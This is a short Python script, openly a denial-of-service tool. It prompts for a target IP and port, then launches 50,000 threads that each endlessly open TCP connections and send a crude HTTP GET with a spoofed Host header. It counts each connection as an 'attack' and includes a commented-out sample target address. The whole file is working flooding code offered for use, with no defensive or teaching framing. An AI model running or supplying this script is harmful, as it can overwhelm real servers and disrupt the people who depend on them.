import socket
import threading
import sys


#fake_IP = raw_input("Input Fake IP: ")
target_IP = input("Input Target IP: ")
target_port = input("Input Target Port: ")
target_port = int(target_port)

fake_IP = '37.239.235.98'
#target_IP = '192.185.26.112'
#target_port = 80

def attack():
    attack_num = 0
    while True:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((target_IP,target_port))
        print("**Connected to " + target_IP + "at Port ", target_port)
        client.sendto(("GET/" + target_IP + "HTTP/1.1\r\n").encode('ascii'), (target_IP, target_port))
        client.sendto(("HOST: " + fake_IP + "\r\n\r\n").encode('ascii'), (target_IP, target_port))
        client.close()
        print("**Closed Connection")
        attack_num = attack_num+1
        print("Attack: ", attack_num)





for i in range(50000):
    thread  = threading.Thread(target = attack)
    thread.start()






